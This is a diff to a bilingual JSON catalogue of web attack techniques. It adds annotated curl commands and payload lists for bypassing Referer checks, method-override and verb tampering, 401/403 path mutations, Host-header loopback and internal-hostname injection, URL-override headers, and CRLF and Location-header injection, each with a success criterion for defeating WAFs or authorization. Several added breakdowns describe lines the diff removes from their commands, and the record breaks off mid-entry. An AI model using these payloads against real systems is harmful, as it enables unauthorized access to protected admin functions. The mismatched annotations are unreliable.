@@ -122,7 +122,33 @@
           "description": {
             "zh": "绕过头名精确匹配的清洗：大写 REFERER 仍被服务端规范化识别。成功判据：管理路径返回 200。",
             "en": "Bypasses exact header-name sanitization since uppercase REFERER still normalizes at the server. Success: admin path returns 200."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "GET /admin HTTP/1.1",
+              "explanation": {
+                "zh": "手工请求行",
+                "en": "Handcrafted request line"
+              },
+              "type": "control"
+            },
+            {
+              "part": "REFERER: http://localhost/admin",
+              "explanation": {
+                "zh": "大写 REFERER 头",
+                "en": "Uppercase REFERER header"
+              },
+              "type": "header"
+            },
+            {
+              "part": "| nc 127.0.0.1 8080",
+              "explanation": {
+                "zh": "nc 直连发送",
+                "en": "Sends raw bytes via nc"
+              },
+              "type": "operator"
+            }
+          ]
         },
         {
           "title": {
@@ -133,7 +159,25 @@
           "description": {
             "zh": "后端二次解码 Referer 时还原可信来源。成功判据：访问控制放行。",
             "en": "The backend double-decodes the Referer back to a trusted origin. Success: access control passes."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-H \"Referer: http%3A%2F%2Flocalhost%2Fadmin\"",
+              "explanation": {
+                "zh": "编码 Referer 值",
+                "en": "Encoded Referer value"
+              },
+              "type": "header"
+            },
+            {
+              "part": "http%3A%2F%2Flocalhost%2Fadmin",
+              "explanation": {
+                "zh": "全编码来源",
+                "en": "Fully encoded origin"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -144,7 +188,175 @@
           "description": {
             "zh": "Origin 与 Referer 各自命中不同校验分支的组合绕过。成功判据：任一信号被采信即放行。",
             "en": "Combining Origin and Referer values that each hit different validation branches. Success: either signal being trusted grants access."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-H \"Origin: https://localhost\"",
+              "explanation": {
+                "zh": "https 本地源",
+                "en": "HTTPS localhost Origin"
+              },
+              "type": "header"
+            },
+            {
+              "part": "-H \"Referer: http://0.0.0.0/admin\"",
+              "explanation": {
+                "zh": "全零地址 Referer",
+                "en": "All-zeros Referer"
+              },
+              "type": "header"
+            },
+            {
+              "part": "http://127.0.0.1:8080/admin",
+              "explanation": {
+                "zh": "管理路径",
+                "en": "Admin path"
+              },
+              "type": "url"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "同站路径伪装",
+            "en": "Same-Site Path Spoof"
+          },
+          "command": "curl -sS --max-time 5 -H \"Referer: https://{TARGET}/admin/\" http://{TARGET}/admin/",
+          "description": {
+            "zh": "伪造目标自身域名路径绕过来源白名单。成功判据：受保护内容返回。",
+            "en": "Forges the target's own domain to satisfy the referer allowlist. Success: protected content returns."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-H \"Referer: https://{TARGET}/admin/\"",
+              "explanation": {
+                "zh": "自域名 Referer",
+                "en": "Self-domain Referer"
+              },
+              "type": "header"
+            },
+            {
+              "part": "http://{TARGET}/admin/",
+              "explanation": {
+                "zh": "受保护路径",
+                "en": "Protected path"
+              },
+              "type": "url"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "查询子串命中",
+            "en": "Query-Substring Hit"
+          },
+          "command": "curl -sS --max-time 5 -H \"Referer: https://{ATTACKER_HOST}/?next={TARGET}\" http://{TARGET}/admin/",
+          "description": {
+            "zh": "绕过 contains 型白名单匹配：攻击者 URL 中嵌入目标域子串。成功判据：授权放行。",
+            "en": "Bypasses contains-style allowlists by embedding the target domain inside the attacker URL. Success: authorization passes."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-H \"Referer: https://{ATTACKER_HOST}/?next={TARGET}\"",
+              "explanation": {
+                "zh": "查询串嵌目标域",
+                "en": "Target embedded in query"
+              },
+              "type": "header"
+            },
+            {
+              "part": "/?next=",
+              "explanation": {
+                "zh": "next 参数载体",
+                "en": "next parameter carrier"
+              },
+              "type": "value"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "大小写与编码组合",
+            "en": "Case & Encoding Combo"
+          },
+          "command": "curl -sS --max-time 5 -H \"REFERER: https://%74arget.example.invalid/admin\" http://{TARGET}/admin/",
+          "description": {
+            "zh": "头名大写加值编码双重变形绕过特征匹配。成功判据：来源校验通过。",
+            "en": "Uppercase header name plus encoded value double mutation evades signature matching. Success: origin validation passes."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-H \"REFERER: https://%74arget.example.invalid/admin\"",
+              "explanation": {
+                "zh": "大写头加编码值",
+                "en": "Uppercase header, encoded value"
+              },
+              "type": "header"
+            },
+            {
+              "part": "%74",
+              "explanation": {
+                "zh": "编码字母 t",
+                "en": "Encoded letter t"
+              },
+              "type": "value"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "Referer注入",
+            "en": "Validation step 1 for Referer-Based Access-Control Bypass Variants"
+          },
+          "command": "https://{ATTACKER_HOST}/path\nhttp://{ATTACKER_HOST}/path\nhttps://{ATTACKER_HOST}/path/\nhttp://{ATTACKER_HOST}/path/\nhttps://{ATTACKER_HOST}:443/\nhttp://{ATTACKER_HOST}:80/\nhttps://{ATTACKER_HOST}:8443/\nhttp://{ATTACKER_HOST}:8080/\nhttps://{ATTACKER_HOST}:8888/\nhttp://{ATTACKER_HOST}:3000/\nhttps://{ATTACKER_HOST}:5000/\nhttp://{ATTACKER_HOST}:9000/\nhttps://{TARGET}.{ATTACKER_HOST}/\nhttp://{TARGET}.{ATTACKER_HOST}/\nhttps://{ATTACKER_HOST}%23{TARGET}/\nhttp://{ATTACKER_HOST}%23{TARGET}/\nhttps://{ATTACKER_HOST}%2523{TARGET}/\nhttp://{ATTACKER_HOST}%2523{TARGET}/\nhttps://{ATTACKER_HOST}%09{TARGET}/\nhttp://{ATTACKER_HOST}%09{TARGET}/\nhttps://{ATTACKER_HOST}%00{TARGET}/\nhttp://{ATTACKER_HOST}%00{TARGET}/\nhttps://{ATTACKER_HOST}%0d%0a{TARGET}/\nhttp://{ATTACKER_HOST}%0d%0a{TARGET}/\nhttps://{ATTACKER_HOST}%0d{TARGET}/\nhttp://{ATTACKER_HOST}%0d{TARGET}/\nhttps://{ATTACKER_HOST}%0a{TARGET}/\nhttp://{ATTACKER_HOST}%0a{TARGET}/\nhttps://{ATTACKER_HOST}.{TARGET}/\nhttp://{ATTACKER_HOST}.{TARGET}/\nhttps://{ATTACKER_HOST}/{TARGET}/\nhttp://{ATTACKER_HOST}/{TARGET}/\nhttps://{ATTACKER_HOST}\\t{TARGET}/\nhttp://{ATTACKER_HOST}\\t{TARGET}/\nhttps://{ATTACKER_HOST}\\n{TARGET}/\nhttp://{ATTACKER_HOST}\\n{TARGET}/\nhttps://{ATTACKER_HOST}\\r\\n{TARGET}/\nhttp://{ATTACKER_HOST}\\r\\n{TARGET}/\nhttps://null/path\nhttp://null/path\nhttps://null/path/\nhttp://null/path/\nhttps://null:443/\nhttp://null:80/\nhttps://null:8443/\nhttp://null:8080/\nhttps://null:8888/\nhttp://null:3000/\nhttps://null:5000/\nhttp://null:9000/",
+          "description": {
+            "zh": "把 Referer 变体逐条置于请求发送；基于 Referer 的访问控制放行任一变体，即确认来源校验可绕过。",
+            "en": "Send each Referer variant with the request; Referer-based access control allowing any variant confirms bypassable source validation."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "https://{ATTACKER_HOST}/path",
+              "explanation": {
+                "zh": "外部域路径",
+                "en": "External domain path"
+              },
+              "type": "value"
+            },
+            {
+              "part": "https://{TARGET}.{ATTACKER_HOST}/",
+              "explanation": {
+                "zh": "子域前缀混淆",
+                "en": "Subdomain prefix confusion"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "https://{ATTACKER_HOST}%00{TARGET}/",
+              "explanation": {
+                "zh": "NUL 拼接来源",
+                "en": "NUL-joined origin"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "https://{ATTACKER_HOST}\\t{TARGET}/",
+              "explanation": {
+                "zh": "制表符拼接来源",
+                "en": "Tab-joined origin"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "https://null/path",
+              "explanation": {
+                "zh": "null 源路径",
+                "en": "Null origin path"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
         }
       ]
     },
@@ -267,11 +479,29 @@
             "zh": "覆盖头族轮换",
             "en": "Override Header Family Rotation"
           },
-          "command": "X-HTTP-Method: DELETE\nX-Method-Override: DELETE\nX-Method: DELETE\nAccess-Control-Request-Method: DELETE",
+          "command": "X-Method: DELETE\nAccess-Control-Request-Method: DELETE",
           "description": {
             "zh": "轮换覆盖头族命中实现读取的任一字段。成功判据：请求按 DELETE 语义执行。",
             "en": "Rotating the override header family hits whichever field the implementation reads. Success: the request executes with DELETE semantics."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Method: DELETE",
+              "explanation": {
+                "zh": "第三种覆盖头",
+                "en": "Third override header"
+              },
+              "type": "header"
+            },
+            {
+              "part": "Access-Control-Request-Method: DELETE",
+              "explanation": {
+                "zh": "CORS 预检方法头",
+                "en": "CORS preflight method header"
+              },
+              "type": "header"
+            }
+          ]
         },
         {
           "title": {
@@ -282,7 +512,33 @@
           "description": {
             "zh": "查询参数携带伪方法绕过头部级覆盖检查。成功判据：资源被删除。",
             "en": "Query-string pseudo-methods bypass header-level override checks. Success: the resource is deleted."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-X POST",
+              "explanation": {
+                "zh": "外层 POST 方法",
+                "en": "Outer POST method"
+              },
+              "type": "flag"
+            },
+            {
+              "part": "?_method=DELETE&method=DELETE&action=delete",
+              "explanation": {
+                "zh": "查询参数伪方法",
+                "en": "Query-param pseudo method"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "_method=DELETE",
+              "explanation": {
+                "zh": "下划线方法参数",
+                "en": "Underscore method param"
+              },
+              "type": "value"
+            }
+          ]
         },
         {
           "title": {
@@ -293,7 +549,33 @@
           "description": {
             "zh": "大小写、尾空格与编码值变形绕过头值特征。成功判据：变形值仍触发方法切换。",
             "en": "Case, trailing space, and encoded value mutations evade header-value signatures. Success: a mutated value still triggers the method switch."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-HTTP-METHOD-OVERRIDE: delete",
+              "explanation": {
+                "zh": "全小写头名与值",
+                "en": "Lowercase name and value"
+              },
+              "type": "header"
+            },
+            {
+              "part": "X-HTTP-Method-Override: %44ELETE",
+              "explanation": {
+                "zh": "编码值覆盖头",
+                "en": "Encoded override value"
+              },
+              "type": "header"
+            },
+            {
+              "part": "%44ELETE",
+              "explanation": {
+                "zh": "编码 D 字母",
+                "en": "Encoded letter D"
+              },
+              "type": "value"
+            }
+          ]
         }
       ]
     },
@@ -417,7 +699,25 @@
           "description": {
             "zh": "绕过一次解码后匹配的 WAF：第二层解码发生在后端路由。成功判据：管理路径返回 200。",
             "en": "Bypasses WAFs matching after one decode; the second decode happens at backend routing. Success: admin path returns 200."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/%2561dmin",
+              "explanation": {
+                "zh": "双重编码字母 a",
+                "en": "Double-encoded letter a"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/%2541dmin",
+              "explanation": {
+                "zh": "双重编码大写 A",
+                "en": "Double-encoded uppercase A"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -428,7 +728,25 @@
           "description": {
             "zh": "分号参数与单点段组合在代理与后端间产生解析差。成功判据：任一形态命中管理路由。",
             "en": "Semicolon parameters plus dot-segments create proxy/backend parsing divergence. Success: any form hits the admin route."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/;/admin",
+              "explanation": {
+                "zh": "空前缀分号形态",
+                "en": "Empty semicolon prefix"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "//;/admin",
+              "explanation": {
+                "zh": "双斜杠加分号形态",
+                "en": "Double slash plus semicolon"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -439,7 +757,56 @@
           "description": {
             "zh": "编码的 . 与 .. 段绕过字面路径规则。成功判据：规范化后进入管理区域。",
             "en": "Encoded . and .. segments bypass literal path rules. Success: normalized path enters the admin area."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/%2e/admin",
+              "explanation": {
+                "zh": "编码点段前缀",
+                "en": "Encoded dot prefix"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/%2E%2E/webadmin",
+              "explanation": {
+                "zh": "编码父段路径",
+                "en": "Encoded parent segments"
+              },
+              "type": "payload"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "401/403 Bypass Techniques",
+            "en": "401/403 Bypass Techniques"
+          },
+          "command": "/admin -> /admin/\n/admin -> /admin/.\n/admin -> /Admin (case change)\n/admin -> /admin%20\n/admin -> /admin%09\n/admin -> /%61%64%6d%69%6e\n/admin -> /admin..;/\n/admin -> /admin;/\n/admin -> /admin?anything\n/admin -> /admin#\n/admin -> /./admin\n/admin -> /admin.html\n/admin -> /admin.json\n/admin -> /admin.js\n/admin -> /admin.css\nX-Host: localhost",
+          "description": {
+            "zh": "对边界设备复测同一组变体；边界与后端判定不一致即确认边界规则可被差异化利用。",
+            "en": "Replay the same variants against the edge device; disagreement between edge and backend verdicts confirms differential abuse of edge rules."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "/admin -> /Admin (case change)",
+              "explanation": {
+                "zh": "大小写变体",
+                "en": "Case variant"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/admin -> /admin%09",
+              "explanation": {
+                "zh": "制表符变体",
+                "en": "Tab variant"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
         }
       ]
     },
@@ -562,7 +929,25 @@
           "description": {
             "zh": "未知动词回落到默认处理器绕过方法级授权。成功判据：返回管理内容。",
             "en": "Unknown verbs fall back to default handlers bypassing method-level authorization. Success: admin content returns."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "FOOBAR /admin HTTP/1.1",
+              "explanation": {
+                "zh": "未知动词变体",
+                "en": "Unknown verb"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-ADMIN /admin HTTP/1.1",
+              "explanation": {
+                "zh": "自定义动词变体",
+                "en": "Custom verb"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -573,18 +958,62 @@
           "description": {
             "zh": "小写方法在部分服务器规范化后仍路由，WAF 特征不命中。成功判据：请求被处理。",
             "en": "Lowercase methods still route after server normalization while WAF signatures miss. Success: the request is processed."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "get /admin HTTP/1.1",
+              "explanation": {
+                "zh": "小写 get 方法",
+                "en": "Lowercase get method"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "post /admin HTTP/1.1",
+              "explanation": {
+                "zh": "小写 post 方法",
+                "en": "Lowercase post method"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
             "zh": "OPTIONS 与 HEAD 旁路",
             "en": "OPTIONS & HEAD Bypass"
           },
-          "command": "OPTIONS /admin HTTP/1.1\nHEAD /admin HTTP/1.1\nOPTIONS * HTTP/1.1",
+          "command": "OPTIONS * HTTP/1.1",
           "description": {
             "zh": "旁路方法不经鉴权中间件但泄露信息或执行动作。成功判据：HEAD 返回管理页面头或 OPTIONS 泄露允许方法。",
             "en": "Bypass verbs skip auth middleware yet leak information or trigger actions. Success: HEAD returns admin page headers or OPTIONS leaks allowed methods."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "OPTIONS * HTTP/1.1",
+              "explanation": {
+                "zh": "星号全局 OPTIONS",
+                "en": "Asterisk-form OPTIONS"
+              },
+              "type": "control"
+            },
+            {
+              "part": "HEAD /admin HTTP/1.1",
+              "explanation": {
+                "zh": "HEAD 头方法",
+                "en": "HEAD method"
+              },
+              "type": "control"
+            },
+            {
+              "part": "OPTIONS /admin HTTP/1.1",
+              "explanation": {
+                "zh": "OPTIONS 方法",
+                "en": "OPTIONS method"
+              },
+              "type": "control"
+            }
+          ]
         }
       ]
     },
@@ -803,7 +1232,8 @@
           "description": {
             "zh": "用合法外部 Host 和随机不存在 Host 记录默认站点、TLS SNI 与路由拒绝基线，并保存原始请求、响应与服务端关联标识。",
             "en": "Record default-site, TLS SNI, and routing-denial baselines using the legitimate external Host and a random nonexistent Host, retaining raw requests, responses, and server correlation identifiers."
-          }
+          },
+          "payload": "Host: localhost\nHost: 127.0.0.1\nHost: 0.0.0.0\nHost: [::1]\nHost: internal\nHost: admin\nHost: backend\nHost: management\nHost: test\nHost: staging\nHost: dev\nHost: development\nHost: debug\nHost: api\nHost: app\nHost: web\nHost: server\nHost: node\nHost: service\nHost: proxy\nHost: gateway\nHost: loadbalancer\nHost: lb\nHost: cdn\nHost: cache\nHost: db\nHost: database\nHost: mysql\nHost: redis\nHost: mongo\nHost: elasticsearch\nHost: rabbitmq\nHost: kafka\nHost: zookeeper\nHost: consul\nHost: etcd\nHost: vault\nHost: kubernetes\nHost: docker\nHost: swarm\nHost: mesos\nHost: marathon\nHost: chronos\nHost: aurora\nHost: nomad\nHost: serf"
         },
         {
           "title": {
@@ -814,7 +1244,7 @@
             "zh": "逐项发送原始 Host 头值，固定目标 IP、协议、路径和身份并记录后端服务标识，严格保持其他变量不变并设置停止阈值。",
             "en": "Send original Host values one at a time while fixing target IP, scheme, path, and identity and recording backend service identity, holding all other variables constant and defining a stop threshold."
           },
-          "payload": "Host: localhost\nHost: 127.0.0.1\nHost: 0.0.0.0\nHost: [::1]\nHost: internal\nHost: admin\nHost: backend\nHost: management\nHost: test\nHost: staging\nHost: dev\nHost: development\nHost: debug\nHost: api\nHost: app\nHost: web\nHost: server\nHost: node\nHost: service\nHost: proxy\nHost: gateway\nHost: loadbalancer\nHost: lb\nHost: cdn\nHost: cache\nHost: db\nHost: database\nHost: mysql\nHost: redis\nHost: mongo\nHost: elasticsearch\nHost: rabbitmq\nHost: kafka\nHost: zookeeper\nHost: consul\nHost: etcd\nHost: vault\nHost: kubernetes\nHost: docker\nHost: swarm\nHost: mesos\nHost: marathon\nHost: chronos\nHost: aurora\nHost: nomad\nHost: serf"
+          "payload": "Host: 2130706433\nHost: 127.1\nHost: 127.0.1\nHost: 0x7f000001\nHost: 0177.0.0.1\nHost: 2130706433:80\nHost: [::ffff:127.0.0.1]"
         },
         {
           "title": {
@@ -824,7 +1254,8 @@
           "description": {
             "zh": "确认请求到达未公开虚拟主机并返回该服务独有的受限内容或审计事件；同时排除默认站点、统一错误页、DNS 无关回显或仅证书名称不匹配。",
             "en": "Confirm that the request reaches an unpublished virtual host and returns service-specific restricted content or audit events; also exclude Default sites, generic error pages, DNS-independent reflection, or certificate-name mismatch alone."
-          }
+          },
+          "payload": "Host: 127.0.0.1, internal\nHost: internal; localhost"
         }
       ],
       "references": [
@@ -852,18 +1283,54 @@
           "description": {
             "zh": "绕过按 localhost/127.0.0.1 字面黑名单的 Host 校验：整数 2130706433、短格式 127.1、十六进制 0x7f000001、八进制 0177.0.0.1 与 IPv4 映射 IPv6 在解析后均为回环地址而字面不同；成功判据：任一变形命中内部虚拟主机（返回内部面板而非默认站点）。",
             "en": "Bypasses Host allow/deny lists on the literal localhost/127.0.0.1: integer 2130706433, short 127.1, hex 0x7f000001, octal 0177.0.0.1 and IPv4-mapped IPv6 all parse to loopback with different literals; success criterion: any variant reaches the internal vhost (internal panel instead of the default site)."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "Host: 2130706433",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "Host: 127.1",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
             "zh": "重复 Host 与列表形态",
             "en": "Duplicate Host and list forms"
           },
-          "command": "Host: localhost\nHost: internal\nHost: 127.0.0.1, internal\nHost: internal; localhost",
+          "command": "Host: 127.0.0.1, internal\nHost: internal; localhost",
           "description": {
             "zh": "绕过\"仅允许一个 Host 头\"校验缺失的代理链：发两个 Host 头（第一行合规、第二行内部名）或逗号/分号列表，不同层各取其一；成功判据：响应内容与单独发内部 Host 时一致（内部站点被返回）。",
             "en": "Bypasses proxy chains missing duplicate-Host validation: send two Host headers (compliant first, internal second) or comma/semicolon lists so different hops pick different values; success criterion: the response matches the internal-Host-only request (internal site returned)."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "Host: localhost",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "Host: internal",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -874,7 +1341,25 @@
           "description": {
             "zh": "绕过大小写敏感或未处理 FQDN 尾点的 Host 规则：RFC 3986 下 localhost. 与 localhost 等价、DNS 大小写不敏感，双标签 internal..admin 部分解析器宽容归一；成功判据：变形仍路由到内部/管理虚拟主机。",
             "en": "Bypasses Host rules that are case-sensitive or ignore the FQDN trailing dot: localhost. equals localhost per RFC 3986, DNS is case-insensitive, and some parsers tolerate internal..admin; success criterion: variants still route to the internal/admin vhost."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "Host: localhost.",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "Host: LOCALHOST",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -885,7 +1370,25 @@
           "description": {
             "zh": "绕过只校验 Host 头而路由层优先取转发头的部署：X-Forwarded-Host/X-Original-Host/X-Host/Forwarded 在反代后端等效决定路由；成功判据：携带转发头的请求返回内部站点内容。",
             "en": "Bypasses deployments validating only Host while routing honors forwarding headers: X-Forwarded-Host/X-Original-Host/X-Host/Forwarded effectively decide routing behind the reverse proxy; success criterion: requests carrying the forwarding headers return internal site content."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Forwarded-Host: internal",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Original-Host: admin",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -1008,7 +1511,33 @@
           "description": {
             "zh": "多覆盖头并存命中实现读取的任一字段。成功判据：路由按注入路径处理。",
             "en": "Multiple override headers coexist to hit whichever the implementation reads. Success: routing follows the injected path."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Original-URL: /admin",
+              "explanation": {
+                "zh": "原始 URL 头",
+                "en": "Original URL header"
+              },
+              "type": "header"
+            },
+            {
+              "part": "X-Rewrite-URL: /admin",
+              "explanation": {
+                "zh": "重写 URL 头",
+                "en": "Rewrite URL header"
+              },
+              "type": "header"
+            },
+            {
+              "part": "X-Override-URL: /admin",
+              "explanation": {
+                "zh": "覆盖 URL 头",
+                "en": "Override URL header"
+              },
+              "type": "header"
+            }
+          ]
         },
         {
           "title": {
@@ -1019,7 +1548,25 @@
           "description": {
             "zh": "编码路径值绕过头值特征匹配。成功判据：解码后进入管理路由。",
             "en": "Encoded path values bypass header-value signature matching. Success: decoded into the admin route."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Original-URL: /%61dmin",
+              "explanation": {
+                "zh": "编码字母 a 路径",
+                "en": "Encoded-a path value"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Original-URL: /%2f%61dmin",
+              "explanation": {
+                "zh": "编码斜杠前缀路径",
+                "en": "Encoded slash prefix"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -1030,7 +1577,25 @@
           "description": {
             "zh": "尾部点段/分号/空格改变头值特征但规范化等价。成功判据：等效路径生效。",
             "en": "Trailing dot-segments/semicolons/spaces alter the signature but normalize equivalently. Success: the equivalent path takes effect."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "X-Original-URL: /admin/..;/",
+              "explanation": {
+                "zh": "分号遍历头值",
+                "en": "Semicolon traversal value"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "X-Rewrite-URL: /admin%20",
+              "explanation": {
+                "zh": "尾空格头值",
+                "en": "Trailing-space value"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -1153,7 +1718,25 @@
           "description": {
             "zh": "绕过单次解码匹配 %0d/%0a 的 WAF：应用再解码一层时双重/三重编码还原出真实 CRLF；成功判据：响应头被拆分（出现受控头名或响应体错位）。",
             "en": "Bypasses WAFs matching %0d/%0a after one decode: double/triple encoding restores real CRLF when the application decodes again; success criterion: the response gets split (controlled header name appears or the body shifts)."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%250d%250a",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%250a",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -1164,7 +1747,25 @@
           "description": {
             "zh": "绕过按规范 CR/LF 字节签名匹配的规则：过长 UTF-8 编码（%c0%8d 等）在宽容解码器中还原为 CR/LF；成功判据：任一序列导致响应头被注入/分割。",
             "en": "Bypasses rules matching canonical CR/LF byte signatures: overlong UTF-8 encodings (%c0%8d etc.) decode to CR/LF on lenient decoders; success criterion: any sequence causes header injection/splitting in the response."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%c0%8d%c0%8a",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%e0%80%8d%e0%80%8a",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -1175,7 +1776,25 @@
           "description": {
             "zh": "绕过不识别 %u 宽转义与反斜杠字面转义的过滤器：IIS 风格 %u000d 与 JSON/JS 风格 \\u000d 在相应解码层还原；成功判据：转义值触达响应层并完成分割。",
             "en": "Bypasses filters blind to %u wide escapes and backslash literal escapes: IIS-style %u000d and JSON/JS-style \\u000d restore at their decoding layers; success criterion: the escaped value reaches the response layer and completes the split."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%u000d%u000a",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%u000a",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -1186,7 +1805,25 @@
           "description": {
             "zh": "绕过成对 CRLF 检测与 NUL 截断清洗：NUL 前缀/中缀被部分容器丢弃后剩下有效分隔符；成功判据：响应出现额外头或内容错位。",
             "en": "Bypasses paired-CRLF detection and NUL-truncating sanitizers: null prefixes/infixes are dropped by some containers leaving valid separators; success criterion: extra headers or shifted content appear in the response."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%00%0d%0a",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%0d%00%0a",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -1197,7 +1834,25 @@
           "description": {
             "zh": "绕过只匹配单一形态（纯编码或纯字面 \r\n）的规则：字面转义与 percent 编码拼接后，在模板引擎/双层解码场景下其一被还原；成功判据：混排输入产生响应分割行为。",
             "en": "Bypasses rules matching a single form (purely encoded or purely literal \r\n): concatenated literal escapes and percent encodings let one layer restore in template engines/double-decode paths; success criterion: a mixed input produces response splitting."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "\\r\\n%0d%0a",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%0d%0a\\r\\n",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         }
       ]
     },
@@ -1487,7 +2142,25 @@
           "description": {
             "zh": "绕过匹配 %0d%0aLocation 的规则：双重/三重编码在二次解码场景还原；成功判据：响应 30x 跳转到攻击域。",
             "en": "Bypasses rules matching %0d%0aLocation: double/triple encoding restores under double-decode scenarios; success criterion: a 30x response redirecting to the attacker host."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%250d%250aLocation:https:/",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%25250d%25250aLocation:h",
+              "explanation": {
+                "zh": "载荷后续行",
+                "en": "Payload next line"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -1498,7 +2171,25 @@
           "description": {
             "zh": "绕过对 \"Location:\" 首字母大写字面模板的规则：全大写/全小写、冒号前空格与制表符形态解析等价；成功判据：响应发生跳转或携带注入 Location。",
             "en": "Bypasses rules on the capitalized \"Location:\" template: all-caps/lowercase, space before the colon and tab forms parse equivalently; success criterion: the response redirects or carries the injected Location."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%0d%0aLOCATION:https://{AT",
+              "explanation": {
+                "zh": "载荷首行",
+                "en": "Payload first line"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%0d%0alocation:https://{",
+              "explanation": {
+                "zh": "载荷后续行",
